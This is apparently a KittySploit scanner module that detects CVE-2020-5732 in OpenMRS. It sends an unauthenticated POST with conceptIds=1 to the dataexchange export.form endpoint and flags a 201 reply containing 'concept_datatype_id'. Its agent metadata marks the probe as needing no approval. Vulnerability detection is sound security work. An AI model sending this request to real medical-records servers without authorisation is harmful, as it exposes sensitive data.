#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OpenMRS dataexchange export.form unauthenticated access (CVE-2020-5732..)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'OpenMRS - dataexchange export.form Disclosure Detection (CVE-2020-5732)',
        'description': (
            'Detects OpenMRS unauthenticated data export by POSTing conceptIds=1 to '
            '/module/dataexchange/export.form and looking for HTTP 201 with '
            'concept_datatype_id.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'openmrs', 'info-disclosure',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2020-5732'],
        'cve': 'CVE-2020-5732',
    }

    base_path = OptString('', 'Optional OpenMRS base path', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        path = f'{self._prefix()}/module/dataexchange/export.form'
        r = self.http_request(
            method='POST',
            path=path,
            data='conceptIds=1',
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r or r.status_code != 201:
            return False
        if 'concept_datatype_id' in (r.text or ''):
            self.set_info(
                severity='high',
                reason='OpenMRS unauth dataexchange export (CVE-2020-5732)',
                path=path,
            )
            return True
        return False
